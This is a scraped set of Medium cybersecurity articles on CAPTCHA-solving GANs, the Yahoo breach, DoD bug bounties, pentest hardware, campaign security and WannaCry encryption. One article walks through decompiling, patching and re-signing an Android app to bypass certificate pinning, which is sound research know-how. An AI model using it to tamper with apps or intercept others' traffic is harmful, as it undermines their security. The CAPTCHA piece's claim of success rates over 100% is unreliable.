The researchers evaluated their approach by applying 33 text-based CAPTCHA schemes, 11 which are currently being used by 32 of the world’s most popular websites ranked by Alexa. Including CAPTCHA schemes being used by Google, Microsoft, eBay, Wikipedia, Baidu and many others. The machine learning model used to attack these CAPTCHA systems only needed 500 non-synthesized CAPTCHAs instead of millions of examples as other attacks before this one (such as Adrian’s) have proposed.
Once the model was initialized with the CAPTCHAs security parameters in mind shown in Figure 2, it was used to generate a batch of synthetic CAPTCHAs in order to train the synthesizer with the 500 real CAPTCHAs obtained from the diverse CAPTCHA schemes shown in Figure 3. The researchers used 20,000 CAPTCHAs to train the pre-processing model along 200,000 synthetic CAPTCHAs to train the base solver.
The machine learning prototype was implemented using Python, the pre-processing model is built using the Pix2Pix framework, which was implemented using Tensorflow. The fine-tuned solver was coded using Keras. [1]
After the generative adversarial networks were trained by using the synthesized and real CAPTCHA samples, the CAPTCHA solver was used then to solve CAPTCHAs from highly visited websites, such as Megaupload, Blizzard, Authorize, Captcha.net, Baidu, QQ, reCaptcha, Wikipedia, etc. The impressive approach of this method is that most of the sites CAPTCHAs were solved with over 80% success rate, exceeding 100% on sites like Blizzard, Megaupload and Authorize.net, an attack method that has proven to have better accuracy on all other prior methods to solve CAPTCHAs, which used large non-synthesized training datasets.
Other than enhanced accuracy, the researchers mentioned on their paper that their approach was not only more accurate, but also more efficient, and less expensive to implement that other methodologies proposed [1]. Besides from being the first GAN based solved for text-based CAPTCHAs, it is an open door for attackers to use, hence their effectiveness and inexpensiveness to implement.
Nevertheless, the approach has some limitations, such as the use of CAPTCHAs with variable numbers of characters, the current approach uses a fixed number of characters — if it’s extended the prototype would break. Another, is the use of variable characters on the CAPTCHA, while the prototype can be trained to support this change, it currently does not as is.
It is important for highly visited websites to use more robust ways to protect their systems, such as bot-detection measures, cyber-security diagnoses and analytics, along multiple layers of security such as device location, types, browsers, etc. — as they are now, an even easier target to attack.
DISCLAIMER: The views expressed in this article are those of the author(s) and do not represent the views of Carnegie Mellon University, nor other companies (directly or indirectly) associated with the author(s). These writings are not intended to be final products, yet rather a reflection of current thinking, along being a catalyst for discussion and improvement.
You can find me on: My personal website, Medium, Instagram, Twitter, Facebook, LinkedIn or through my web design company.
[1] Yet Another Text Captcha Solver: A Generative Adversarial Network Based Approach | Guixin Ye, Zhanyong Tang, Dingyi Fang, Zhanxing Zhu, Yansong Feng, Pengfei Xu, Xiaojiang Chen, Zheng Wang | Lancaster University, Northwest University, Peking University | https://www.lancaster.ac.uk/staff/wangz3/publications/ccs18.pdf
[2] Generative Adversarial Networks | Ian J. Goodfellow, Jean Pouget-Abadie , Mehdi Mirza, Bing Xu, David Warde-Farley, Sherjil Ozair , Aaron Courville, Yoshua Bengio | Department of Computer Science and Operations Research, University of Montreal | https://arxiv.org/pdf/1406.2661.pdf
[3] Zero-Sum Games | Game Theory | Stanford University | https://cs.stanford.edu/people/eroberts/courses/soco/projects/1998-99/game-theory/zero.html
[4] Deep Learning for Computer Vision with Python | Adrian Rosebrock | https://www.pyimagesearch.com/deep-learning-computer-vision-python-book/
[5] Gao, H., Tang, M., Liu, Y., Zhang, P., and Liu, X. Research on the security of Microsoft’s two-layer captcha. IEEE Transactions on Information Forensics & Security 12, 7 (2017), 1671–1685
[6] Gao, H., Wei, W., Wang, X., Liu, X., and Yan, J. The robustness of hollow captchas. In ACM Sig | https://www.lancaster.ac.uk/staff/yanj2/ccs13.pdf
[7] Mohamed, M., Sachdeva, N., Georgescu, M., Gao, S., Saxena, N., Zhang, C., Kumaraguru, P., Oorschot, P. C. V., and Chen, W. B. A three-way investigation of a game-captcha:automated attacks, relay attacks and usability. In ACM Symposium on Information, Computer and Communications Security (2014), pp. 195–206
[8] Yan, J., and Ahmad, A. S. E. A low-cost attack on a microsoft captcha. In ACM Conference on Computer and Communications | http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.295.9469&rep=rep1&type=pdf
Written by
","['AI', 'ML', 'Data Science', 'Tech', 'Top', 'Latest', 'Get Published', 'Home', 'Artificial Intelligence', 'Machine Learning', 'Cybersecurity', 'Hacking', 'Technology']"
Breaking Down Yahoo’s Breach of 500 Million Users - Jeremiah Grossman - Medium,https://medium.com/@jeremiahg_5595/breaking-down-yahoos-breach-of-500-million-users-77b09c561ba4?source=tag_archive---------1-----------------------,"(Former information security officer at Yahoo, 2000–2001)
I’ve spent the past two days closely following my former employer as they manage the process of disclosing one of the largest breaches — if not the largest — in history.
We’re talking names, email addresses, telephone numbers, dates of birth, passwords, plus security questions and answers of more than 500 million people. Let’s let that magnitude burn in…. 500 million people — more than the entire U.S. population.
Whenever a mega-breach is disclosed, everyone is going to have opinions — often based entirely on speculation. And I’ll admit to having a healthy dose of that, based on my industry experience and the information we have at this point. One thing we do know for sure: the impact of this breach will be felt far and wide and is likely to continue for months, or even years, to come. This breach also speaks loudly to the increasing threats around cyber espionage and state-sponsored attacks, and the role that technology giants play in the security and privacy of our daily lives.
What Went Wrong
Let’s start by discussing a big piece of the security challenge. Based on my experience at Yahoo, a significant factor in this breach is the sheer size of its networks. Like many large companies, Yahoo has sprawling networks with hundreds of thousands of hosts in distributed locations around the world — along with thousands of employees and contractors, with an untold number of devices. All this makes for a massive attack surface that is difficult for anyone to effectively protect. As always with cybersecurity, the bad guy just needs to find and exploit a single point of vulnerability to win, while the defenders must be perfect all the time.
Another factor at play is that big organizations with vast technology infrastructures often rely on homegrown security solutions because most off-the-shelf products and services are not capable of operating at their scale. It could be that this issue created gaps in their security program because they’re unable to use cutting-edge security products designed to thwart modern threats that most everyone else can.
There are too many users, too much network traffic, and too much data for most security products on the market to handle, so these companies are forced to forge their own way for scalability reasons. I remember encountering this issue a number of times during my tenure at Yahoo. It’s a common complaint by many information security professionals, well beyond Yahoo, to this day. The only real option available is building custom controls and putting them in place.
While it’s easy to infer contributing issues that may have ultimately allowed an attack of this magnitude, there are a number of unanswered questions. Getting the full picture, or at least as much as we’re able, is a good learning experience for all of us.
The Missing Information
Sources close to the matter at Yahoo recently answered one of the most important questions: when did Yahoo learn of the breach? Reports state that after a profiteer hacker by the name of “Peace of Mind” publicly advertised that he had 200 million Yahoo credentials for sale, Yahoo launched an investigation into the claim. The investigation apparently was unable to confirm the breach or the validity of the data, but Yahoo subsequently launched a separate investigation to dig deeper. All this is said to have transpired roughly 2 months ago in early August.
What the investigation found roughly two months ago was the 500 million user breach, which they credited to a state-sponsored actor. If that’s the case, it’s possible we’re looking at two different breaches — if, of course, the claims by Peace of Mind are factual. It sounds strange to say, but the discovery of this more recent breach may be thanks to the hacker behind the first scandal.
While we’re on the topic of timing, Yahoo stated the breach originated back in late 2014. This begs the question of why it took so long for Yahoo to detect a breach of 500 million users. Were there no other indicators of compromise that triggered alarms, or maybe no one was looking at the alarms, or some combination thereof? Again, we don’t know.
Regardless, this lack of rapid breach detection is sadly consistent with industry norms. Many corporate victims of cybercrime go months or even years before noticing a breach. And when they do find out, they’re often tipped off by a third-party. Check and check.
The timing of the events is a particularly important detail in the story: not only because of what it says about companies’ transparency with users, but also because it determines what information was accessed, and for what purpose. This importance is heightened by the claim that the attack was perpetrated by a state-sponsored hacker — some saying Russia, according to sources close to the issue — which wouldn’t be surprising to most anyone in the industry, though it does bring up several more questions about what we can expect from the investigation.
The motivation for state-sponsored hacking is definitely present in this breach. We’re seeing some parallels between this and the Google Aurora attacks in 2010, pointing to the idea that state-sponsored hacking activity is playing out on networks like Yahoo’s because they’re a valuable source of information on their enemy’s or ally’s strategy. These networks are where the espionage activity is happening. If you are a nation-state and want to determine if any of your domestic spies have been discovered, you put taps on Google, Yahoo, Microsoft etc., rather than just hacking government systems to find out. Beyond spy activity, there is also the motivation to deanonymize political dissidents. Instantly China and other countries comes to mind.
One of the most interesting aspects of this case, in my opinion, is the involvement of Peace of Mind. State-sponsored adversaries don’t publicly share stolen data or sell it — Peace of Mind has been all about selling stolen Yahoo account data since he raised the issue in August, leading me to believe it’s unlikely he is state-sponsored or affiliated with this week’s breach disclosure. Again, this is only if his claims are indeed true, which we may never know. If they are, though, it looks like there’s at least two different Yahoo breaches by two different hacking groups.
Why Do We Care?
As the rumor mill keeps churning, it’s impossible to ignore how this breach will impact Yahoo’s sale to Verizon. During an acquisition, it’s common for acquirers to conduct a full security audit of the organization. They want to know what risks, whether simply system vulnerabilities or full breaches, ahead of the deal closing. In the case of the Yahoo breach, now that it’s public, Verizon must consider the risks and costs associated with potential lawsuits in the price of the deal. And of course, any impact on share price will be closely monitored.
For affected Yahoo users, there’s a lot of bad advice making the rounds right now. Please be mindful. While Yahoo has said there is no evidence that attackers are currently in the network, as a precaution I recommend immediately changing not only your Yahoo password (and enabling two-factor authentication), but more importantly, any other accounts for which you might have used the same credentials. Attackers will most certainly leverage these set of credentials and try them against multiple accounts on other systems (i.e. Google, LinkedIn, Facebook, etc) until they are successful. And, take the time to change your secret questions and answers too, as those pieces of information can be used to get into your account as well.
With 500 million users waiting on further information, I’m very interested to see how Yahoo handles the “breach of the year” spotlight. More importantly, I hope we’ll learn some good lessons from this breach that will make a difference in the wider business world. This story is an opportunity to light a fire of urgency under major corporations to protect their users’ information from a more modern (and therefore realistic) standpoint.
If we look back through the history of breaches, for the vast majority, we knew ahead of time how to prevent these issues, detect them and fix them. What we’re lacking most is not so much awareness, but motivation to act with the right response, at the right time.
Yahoo wasn’t the first to experience a mega-breach, and it certainly won’t be the last. This is the modern world’s new normal.
Written by
","['Security', 'Cybersecurity', 'Yahoo', 'Data Breach']"
Building on the Lessons Learned from Hacking the Pentagon,https://medium.com/@SecDef/building-on-the-lessons-learned-from-hacking-the-pentagon-b5b58548b6a9?source=tag_archive---------8-----------------------,"As Secretary of Defense, my number one priority is making sure that the force of the future is just as great as the one today. That means we need to stay competitive and open to new ideas. And that is why one year ago, I created the Defense Digital Service (DDS), a group focused on bringing in talent from America’s most innovative sectors for a tour of duty at DoD to help us solve some of our most complex problems.
The team of technologists at DDS have achieved many important milestones, like improving data sharing between DoD and the VA, to make sure our veterans get access to their benefits. One of their most significant achievements to date was the launch of the Federal Government’s first bug bounty in April of this year.
Bug bounties are a widespread best practice in the outside world — and the concept is relatively simple. A company offers incentives to outside researchers — what most of us would call white-hat hackers — to test the security of its networks and applications, and report what they find, so the company can fix the vulnerabilities.
DoD’s first bug bounty, Hack the Pentagon, exceeded expectations. All told, more than 1,400 hackers were invited to participate in Hack the Pentagon and more than 250 submitted at least one vulnerability report. Of all the submissions we received, 138 were determined to be legitimate, unique, and eligible for a bounty.
By allowing outside researchers to find holes and vulnerabilities on several sites and subdomains, we freed up our own cyber specialists to spend more time fixing them than finding them. The pilot showed us one way to streamline what we do to defend our networks and correct vulnerabilities more quickly.
Because of the overwhelming success of Hack the Pentagon, I am pleased to announce two new initiatives:
Today I signed a vulnerability disclosure policy covering all Department of Defense websites. For the first time, anyone who identifies a security issue on a DoD website will have clear guidance on how to disclose that vulnerability in a safe, secure, and legal way. This policy is the first of its kind for the Department. It provides left and right parameters to security researchers for testing for and disclosing vulnerabilities in DoD websites, and commits the Department to working openly and in good faith with researchers.
The Vulnerability Disclosure Policy is a ‘see something, say something’ policy for the digital domain.
DoD is committed to being open, engaged, and accepting of skilled researchers who can help us improve our defenses — and to providing the legal avenues for these security researchers to do so.
We hope that this policy will yield a steady stream of disclosures, allowing us to find and fix issues faster. The net effect is that the Department of Defense, our service members, and the public will be safer and more secure.
Although the new vulnerability disclosure policy covers all DoD websites, we also want to sponsor focused challenges on specific networks and systems, so we are also launching more bug bounties. Today we opened registration for the Hack the Pentagon follow-on, called Hack the Army, which was first announced by Secretary of the Army Eric Fanning on November 11th. This challenge is focused on Army websites that support the recruiting mission, and it is the first of many more bounties to come.
Just as we did with Hack the Pentagon, we have contracted with HackerOne so we can reap the benefits of crowdsourced vulnerability discovery and disclosure. All DoD Components have the ability to leverage this contract to host their own bounties in the future.
Hack the Army represents a significant step forward from Hack the Pentagon in that the Army websites offered up to hackers will be more dynamic, rather than simply static websites that aren’t operationally significant. These sites are critical to the Army’s recruiting mission, and as a result must be hardened.
The full list of Army websites and databases that bug hunters will be allowed to hack under the program will be provided to all invited participants soon after. Participants who take part in this bug bounty are eligible to receive thousands of dollars in rewards.
The Vulnerability Disclosure Policy and Hack the Army initiatives underscore the Department’s commitment to innovation and adopting commercial best practices. DoD has focused on efforts to modernize our security and find ways to tap into sources of talent across the country.
You can find more information about both of these programs at HackerOne.com/DeptOfDefense and HackerOne.com/HacktheArmy.
Written by
","['Security', 'Hacking', 'Digital', 'Cybersecurity', 'Government']"
Buying a professional penetration testing laptop for 2017,https://medium.com/@securitystreak/buying-a-professional-penetration-testing-laptop-for-2017-6cd21e65dc2?source=tag_archive---------0-----------------------,"I need to place my bet on a new pentesting laptop that will get me further into the 21st century.
This article discusses some of my considerations when faced with this decision. All prices listed are from early August 2016. Article last updated in July 2017.
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Antivirus in 2017: Why? Which? How? | Penetration Testers’ Guide to Windows 10 Privacy & Security | Full Disk Encryption with VeraCrypt | Hacker to Security Pro! On the Shoulders of #InfoSec Giants | Securing an Android Phone or Tablet (LineageOS) | Password (IN)SANITY: Intelligent Password Policy & Best Practices | Security Architecture Patterns I & Patterns II
Amongst my peers, there are four favorite brands: Apple, Dell, HP and IBM/Lenovo. I also reviewed all major “Linux laptop” resellers but found they are all based on one of these brands.
These last eight years, I have been using OS X/MacOS as my base operating system. But my current souped-up MacBook Pro (MBP) model seems on track for its planned obsolescence.
The Dell XPS line has gotten some traction in the Linux community. However having owned the XPS 13 (9343) for over a year, I would argue it failed to run anything glitch free that wasn’t the latest version of Ubuntu. But what a beautiful design…
HP will not be making the cut as any customized model that fits my needs has an almost Apple-like price tag. I’ve never enjoyed their plastic-fantastic form-factor either. My mom keeps buying them, perhaps that factors in.
I will be returning to my roots and wager my money on another Thinkpad. The first great laptop I owned was an IBM ThinkPad X40. The perfect 12.1"" hacker laptop which ran Fedora Core Linux and is still in working order until this day.
Alternative sellers you could consider are: iBuyPower / Purism / Razer / Schenker / System76 / Tuxedo / Xiaomi Mi / ZaReason as we’ll soon learn it’s all about the chips.
As security professionals, we run many virtualized operating systems (guest VMs). This gobbles up RAM, CPU cores and hard disk space. Virtualization has made our work safer and far more efficient, it is here to stay.
Whichever model I end up with I will upgrade to 32GB of Random Access Memory (RAM) ($0.27/GB) and preferably a SATA III Internal Solid State Drive (SSD) (~$0.35/GB). Capability to upgrade to 64GB of RAM in the future would be “nice”.
When possible, I buy waterproof and shockproof electronics. I am a huge fan of the durable Adata HD720 product line ($0.065/GB) for secure project archival and system backups. It is the only external Hard Drive brand I’ve owned of which the drives outlasted other brands, generation upon generation.
Strong support for virtualization is an absolute need. I frequently work with VMWare Fusion/Workstation/ESXi, as well as Xen, and KVM. It is also the future of computing. Hardware supported security would be superb.
Taking a page out of the Qubes 4 suggested hardware:
I would also like to include:
At the time of the last article update, 43 Intel CPUs match my criteria.
To achieve the greatest compatibility, I will opt for an Intel GPU. In most cases, we offload all password cracking to cloud-based Linux GPU instances. No single laptop GPU could ever compete with that.
Obscure Linux and BSD distributes may react poorly to HiDPI screen resolutions. That said, screen real estate is king, and I cannot drag my external monitor with me to engagements.
It has been reported to me by owners with a NVIDIA GPU that it can be disabled in BIOS in favor of the Intel GPU built into the Intel CPU. I have not confirmed this and would love to hear from anyone who has.
State-sponsored cyber attacks are not my immediate concern. I’m well aware of the internet war (1) (2) that is playing out between friend and foe alike. I know all things I do are being captured and stored indefinitely.
That said, Lenovo, please don’t let us down (again). China + Superfish + Lenovo Service Engine + Lenovo Customer Feedback Program. If I were considering Windows as my base operating system, you would not have made the cut.
I also enjoy reading comebacks for terrible arguments:
“Arguing that you don’t care about the right to privacy because you have nothing to hide is no different than saying you don’t care about free speech because you have nothing to say” ― Edward Snowden
However, I am much more concerned with my professional responsibility towards my clients and keeping my sanity. I’ve come across (intentional?) backdoors left behind and malware introduced by other testers.
Security professionals never pirate right? Do you analyze malware on the same machine you store client results? Every vendor solution that can effectively keep up with Endpoint Intrusion Prevention, Detection, and Remediation, relies heavily on virtualization to do so.
“Just because you’re paranoid doesn’t mean they aren’t after you.” ― Joseph Heller
I am opting not to concern myself with impractical paranoia surrounding Intel ME/FSP, and for that matter Intel vPro. This is a penetration testing laptop, not an “off-the-grid” laptop. The overly paranoid can sink their bitcoins into CrowdSupply campaigns like ORWL or look into disabling Intel ME.
I also choose to rely on the security features provided by IBM’s BIOS. Installing an open-source Basic Input Output System (BIOS) like Coreboot isn’t an option for newer ThinkPad models.
I plan to install Red Hat Fedora Linux, or in this case, the Qubes 4 “distribution” expected at the end of this year. Currently, Qubes 3 is a Fedora 23/Xen PV based system, but kind of different. With the upcoming release, they will move to hardware-enforced memory virtualization (Intel EPT).
For backups and project archiving, I am a huge fan of the durable Adata HD720 product line ($0.065/GB). The only brand I have owned during my lifetime of which the drives did not suddenly fail.
Using Linux as my everyday desktop does not make me that enthusiastic.
I love working with Red Hat Enterprise Linux (RHEL) / CentOS when engineering cloud-based environments. However, I abandoned Fedora 10 for OS X as weekly updates would break something essential.
Qubes-OS is a young distribution. There has been criticism over the prioritization of desktop bugs and choosing Xen over KVM. At the end of the day, it is their project; they are calling the shots.
My primary aim is to challenge myself to further improve my security posture and routines. Usable security is an often overlooked factor in managing IT risk. I have traced several incidents to malware brought into the network by third party penetration testers.
It will not hurt that I know the Red Hat distributions inside and out. The odds of success increase through my familiarity with preventing and detecting intrusions. I can only hope I do not lose time to debugging and reporting issues on a weekly basis.
Qubes appears well-documented. Should it for any reason not work out as planned I am likely to install a BSD based operating system and run KVM — but that’s a story for another day.
Qubes allows you to spin up persistent and disposable VMs based on Fedora, Debian, and Whonix.
It is reportedly easy to create templates for pentesting distributions BlackArch (Arch) and Kali (Debian). Installing a cloud-oriented pentesting distribution such as BackBox (Ubuntu) or Parrot (Debian) is an option.
With the release of Qubes 4, I expect better support for Windows and BSD. I will look into documenting the template creation for Alpine Linux.
Only the T- and P-series support 32GB of RAM.
Though I might end up paying to have the SSD drive installed by the manufacturer, I am not paying $400 for a RAM upgrade to 32GB.
The P-series has absorbed the old W-series line and support up to 64GB of RAM and a 1TB SSD. But every model sports a NVIDIA GPU which guarantees issues due to its proprietary drivers.
Which leaves us with the T560, T460, T460p, and the T460s.
Please do your research into FHD (1920x1080) and WQHD (2560x1440) resolutions. Linux compatibility with HiDPI varies from application to application (Qt vs GTK). For some models, there no longer is a choice.
For several CPU upgrades other components, such as the NVIDIA GPU, are mandated. I did opt for Windows Pro, backlit keyboard, fingerprint, and smart card reader, and the large capacity battery (when available).
Using the RetailMeNot SAV30THINKPAD coupon, I managed an extra $75 in savings above the normal internet discount.
Note that
http:/shop.lenovo.com/us/en/laptops/thinkpad/t-series/t560/
Specs:
Pros and cons:- Terrible keyboard!!!+ i7 processor+ 15.6"" screen+ FHD resolution- up to 32GB DDR3L RAM (expensive stuff!)~ max 512GB SATA3 SSD+ Hardware dTPM
http://shop.lenovo.com/us/en/laptops/thinkpad/t-series/t460p/
Specs:
Pros and cons:- i5 processor (i7 forces NVIDIA)~ 14"" screen- WQHD screen (FHD currently unavailable)+ up to 32GB DDR4 RAM~ max 512GB SATA SSD+ Hardware dTPM (even if not listed in product description)
http://shop.lenovo.com/us/en/laptops/thinkpad/t-series/t460/
Specs:
Pros and cons:+ i7 processor~ 14"" screen+ FHD screen- up to 32GB DDR3L RAM (expensive stuff!)~ max 512GB SATA SSD+ Hardware dTPM (even if not listed in product description)
https://shop.lenovo.com/us/en/laptops/thinkpad/t-series/t460s/
Specs:
Pros and cons:+ i7 processor~ 14"" screen+ FHD screen+ DDR4 RAM- only up to 20GB :(+ max 1TB PCIe-NVMe SSD ($500 upgrade)- no large capacity battery+ Hardware dTPM (even if not listed in product description)
If I would choose today, it would be the T460p. $812 on checkout with the stock HD and coupon.
Upgrading it myself to a 512GB SATA SSD will run me $220, $70 cheaper than Lenovo’s upgrade. Assuming I spend $120 on the 32GB of RAM, I will own a laptop capable of running my digital toolkit, for $1152.
Compare that to the $3200 I would need to shell out for a 15"" Macbook Pro that maxes out at 16GB of RAM!
Buying a ThinkPad doesn’t always grant immediate gratification. Most modifications to the configuration trigger a 3–5 week delivery time.
To conclude this article I will share with you, my final decision and remaining thoughts:
I ordered the T460p when it came back on the weekly sale, apparently the only time the coupon works. I opted for the 14.0 FHD IPS Non-Touch Display and with additional warranty and taxes paid $866.48.
Warning: do not get a model with “Windows Signature Edition” [July ’17: a workaround is now available]
I grabbed the G.SKILL Ripjaws Series 32GB (F4–2133C15D-32GRS) for $119.99 and the SAMSUNG 850 PRO 2.5"" 1TB SSD (MZ-7KE1T0BW) for $422.66. Pushing my total amount wagered to $1409.13.
It was easy to opt for Samsung as they build the entire SSD themselves, it was harder to decide between their EVO and PRO line. I did end up going over my budget for that component; to guarantee sufficient disk space, I/O performance, and longevity.
If you are willing to spend $2500 or more, I recommend taking a closer look at the HP Zbook. This model is currently listed three times on NotebookCheck’s “Top 10 Workstation Laptops”. Furthermore, they allow customers to have an Intel GPU, opt out of vPro, Windows licenses, having a webcam or even a hard-drive!
I am still very pleased with the build quality and performance of the T460p model I purchased. Glad I splurged on a speedy and large SSD as well as 32GB of RAM.
These resources are put to work on a daily basis, and I’m already forced to rotate VMs to external drives if they become irrelevant to conserve space.
Click the ♡ to recommend this article.
Written by
","['SLAT', 'Tweakers.net', 'Penetration Testing', 'Linux', 'Information Security', 'Vmware', 'Cybersecurity']"
Bypassing OkHTTP3 Certificate Pinning - Independent Security Evaluators,https://blog.securityevaluators.com/bypassing-okhttp3-certificate-pinning-c68a872ca9c8?source=tag_archive---------6-----------------------,"Certificate pinning in Android applications makes it slightly more difficult to reverse engineer them, by restricting trusted certificates to those included in the operating system or hard-coded in the application rather than allowing the user control over trusted CAs. While there is already plenty of documentation on circumventing restrictions that force the use of the system’s certificate store in applications running on Android 7 (code name Nougat) and later, there isn’t as much documentation on circumventing certificate pinning provided by third-party libraries. In this blog, I will discuss the process of circumventing certificate pinning provided by the OkHTTP3 library.
Sometimes I run into applications that harden their security posture by making use of certificate pinning. Certificate Pinning is the process of comparing the server’s TLS certificate against a saved or pinned copy of that certificate. Mobile application developers are often encouraged to bake in a copy of the server’s certificate and make use certificate pinning because it increases the complexity of Man-In-The-Middle attacks.
After you have taken in the illustration above, note that certificate pinning attempts to ensure that the client is not exchanging messages with any other server than the one they hold a public key for. Therefore, the client is not exposed to attacks where a rogue Certificate Authority (CA) validates the authenticity of a malicious host serving content with a sham certificate.
A common misconception about certificate pinning is that it prevents the user from viewing client-server communications. In other words, the misconception is that certificate pinning is going to make up for the lack of proper security mechanisms (such as authorization and authentication) in client-server communications.
Most Android applications can be easily “patched” and reinstalled. The first thing we need to do is get an approximation of the application’s source code. Android applications are stored in the APK format, which is pretty much a ZIP file with some compiled resource files. We can use Apktool to un-package and translate the applications resources and code by running the command below.
$ apktool d <source.apk> -o <destination_directory>/
After decompiling the APK we should have a directory named dest that contains all of the resources that were in the source APK. Now that we have all of the resources we can search for common certificate pinning implementations. This usually involves searching for the strings “verify”, “check”, “TLS”, “SSL”, and “X509”. For our example we already now that we are going to be patching the certificate pinning class available in the OkHTTP3 library. A little bit of patience and a lot of googling landed me at this file in Square’s GitHub repository. Below I have included an excerpt of the method that verifies the pinned certificate so that our discussion is a little easier to follow.
As you can see on line 10 of the gist I included above (line 180 of the entire file I linked from Square’s github), if the hash matches the sha256 the certificate is verified and we return. There is even a really handy comment that says “Success!” in the source that made the reversing process a little more fun. Now that we know what the Java source looks like, it is easy to find and patch the smali code that was created for us by Apktool. Because this was a library that was imported by the APK when it was built, class names were preserved and I was able to find a file called “ CertificatePinner.smali” based of the original Java source “CertificatePinner.java”.
In the smali we can see that the check we performed in our previous GitHub gist on line 8 is now performed on line 12. Then on line 14 of this gist, the application uses if-nez if the return value that was stored in v10 on line 12 was non-zero. Since we want our application to use our sham certificate so that we can view client-server communications, we are going to swap that if-nez with a if-eqz. Then, when the application checks our certificate against the one that is pinned it will continue execution instead of exiting.
After we patched the smali code we just saw, we need to rebuild and reinstall the application. Below I outlined the steps that you could follow to wrap things up.
$ apktool b <source_directory>/ -o <patched.apk>
2. Create a signing key using Keytool.
$ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
3. Sign the resulting APK with Java’s JarSigner.
$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore <patched.apk> alias_name
4. Install the application on our device once more using Android’s ADB.
$ adb install <patched.apk>
Certificate Pinning is a great security enhancement and it should be used whenever there is a concern of Man-In-The-Middle attacks carried out by external parties. However, certificate pinning does not prevent users from viewing the traffic sent between their device and the server. It’s important to remember that users will be able to circumvent measures that rely on placing restrictions on the client. When it comes to Android applications, it is often trivial to patch the application to ignore certificate pinning and allow the user access to client-server communications.
Rick Ramgattie, Security Analyst @ Independent Security Evaluators
Twitters: @rramgattie, @ISESecurity
Written by
","['About', 'Threat Feed', 'ISE Labs', 'Blockchain Security', 'Blog Archive', 'Security', 'Android', 'Hacking', 'Cybersecurity']"
Campaign Information Security - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/campaign-information-security-ff6ac49966e1?source=tag_archive---------9-----------------------,"A committee of top tier infosec heavy weights (and a half dozen interns) got together and wrote a guide to campaign information security. It’s a fine document produced by a lot of talented people and definitely a good starting point. Indeed, it mirrors much of the advice I put together in August 2016 for political campaigns. I’m sure the authors have considerably more expertise on the details and ground realities of political campaigns than I do. Still, there’s some additional content that I believe is worth sharing, perhaps it will be of use to someone.
Rule #1: your objective is not “don’t get hacked,” your objective is “don’t let the adversary get useable information”
The first and most important thing to keep in mind that your goal is to deny the adversary useful information. Not getting hacked is certainly the first step towards that goal, but it is not the final step.
Rule #2: authenticity is the only thing that people believe
If the worst case scenario happens and the adversary begins leaking your data, verify that it hasn’t been tampered with or altered. The Soviets preferred a mixture of 9 parts truth to 1 part dezinfomatsiya for their influence operations. When you encounter an alteration or manipulation, you must immediately expose it by showing the original. This robs the adversary of authenticity. Their lost credibility is your gain.
Rule #3: the “e” in email stands for evidence
Do not use email for anything that isn’t routine or mundane (“anyone hungry? Let’s get lunch,” is ok, gossip or rumours is not.) Communications are critical and in descending order of preference:
Rule #4: use deception to lure the adversary out
Get a Canary for your office network and configure it as a file or email server. They are ridiculously easy to setup, they’re cheap, they have essentially zero false positives. This means that an alert from the Canary is highly likely to be indicative of malicious activity on your network.
Rule #5: use deception to consume the adversary’s analytic resources (hide your lake in an ocean)
Your team can focus on a limited number of real files while the adversary has to sift through everything that you produce. They cannot skimp on analytic resources because they have a deadline. Use this to your advantage by generating volumes of irrelevant useless content. Ensure there are no patterns (eg, same two interns as authors; naming schemes, locations, etc)…you want to force them to analyze everything.
Rule #6: use deception to mitigate the damage of a penetration
The major flaw with using Signal is that the numbers are attributable, which means a compromised account can expose all the sensitive information. Firstly, use ephemeral messaging. If there is something important you need to remember, copy it out of the message and put it into a locked note on the iPhone. Secondly, use Wire, registered with disposable email accounts (ProtonMail) and create cover names. You’ll easily remember the few important people you talk with, but figuring out who they are will consume adversarial analytic resources. Consider using Teams, a feature that allows you to setup a dedicated Wire server for your core group.
Rule #7: the way to fight trolls is with elves
Trolls do a number of dangerous things, they spread misinformation, they sap the energy and will of the genuinely interested people, and they amplify opinion suggesting it is the majority or consensus view. They must be thwarted by a professional team of paid social media elves, who work to counter the misinformation, to act as a tar pit keeping the trolls away from civilians, and to prevent the trolls’ orchestrated actions from appearing organic.
The original guides suggestions to have designated people for key roles is good. But in the real world, those people are always in the wrong place when you need them. Consider implementing a PACE system for designated positions. One Primary, an Alternate, a Contingency and an Emergency. At a minimum have an alternate to fall back on if your primary is unavailable.
This guide from Tech Solidarity is a good starting point.
Defeating disinformation campaigns is not impossible, but it’s important to remember that the goal is to disrupt and counteract the exploitation of the collected information. Not getting hacked is a start, but it’s only a start. Be prepared to counter the disinformation campaign, and work to hinder its ability to collect anything useable. After all, this strategy worked for Macron in France. Even with access, there was nothing interesting or salacious to leak. Bland emails make for resilient campaigns.
Support more posts like this.
Written by
","['Information Security', 'Security', 'Cybersecurity', 'Operational Security']"
Can files locked by WannaCry be decrypted: A technical analysis,https://medium.com/threat-intel/wannacry-ransomware-decryption-821c7e3f0a2b?source=tag_archive---------5-----------------------,"The WannaCry ransomware worm has dominated the global news cycle since it started spreading on Friday.
The ransomware has now been reported in more than 150 countries around the globe, affecting hundreds of thousands of machines and more than 10,000 companies.
Symantec has already published a blog detailing much of what you need to know about this ransomware, and how to protect yourself. However, further investigation by our expert analysts who are trying to discover a decryption key to neutralize this threat has uncovered more technical details.
Analysis by our engineers indicates that the malware has two hardcoded public keys deployed as part of this ransomware: one is used for the main task of encrypting files, while the other is used to encrypt a small number of files for “demo decryption” — so the ransomware authors can “prove” to victims that they are able to decrypt the files. Let’s call them attacker public key and demo public key, which will be explained further later.
Once the malware is running on the victim machine it will generate a new unique RSA 2048 bit asymmetric key pair. This means that each victim needs their own decryption key.
Once the new unique key pair is generated, the malware exports the victim’s public RSA key to a local file called 00000000.pky using CryptExportKey API. Next, it exports the victim’s private RSA key and encrypts it with the hardcoded attacker public key from the malware and stores it as 00000000.eky on disk. Now that the key has been stored safely, the malware uses CryptDestroyKey API to destroy the private key in memory, which limits the time for recovering private key parameters from memory by any other tool. Unfortunately, the lifetime of private victim RSA keys is so limited that there is no good option to recover it later once the encryption has happened.
